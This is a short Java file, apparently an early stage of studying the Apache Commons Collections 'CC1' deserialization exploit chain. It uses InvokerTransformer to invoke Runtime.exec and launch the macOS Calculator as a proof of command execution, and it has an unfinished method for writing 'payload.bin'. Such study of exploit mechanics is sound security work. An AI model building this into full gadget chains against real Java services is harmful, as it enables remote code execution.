package con.yhy;

import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class CC1Test {
    public static void main(String[] args) throws Exception {
        String calc = "open -a Calculator";
        Runtime r = Runtime.getRuntime();
//        Class c = Runtime.class;
//        Method method = c.getMethod("exec", String.class);
//        method.invoke(r,"open -a Calculator");


        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{calc}).transform(r);

    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"));
    }
}
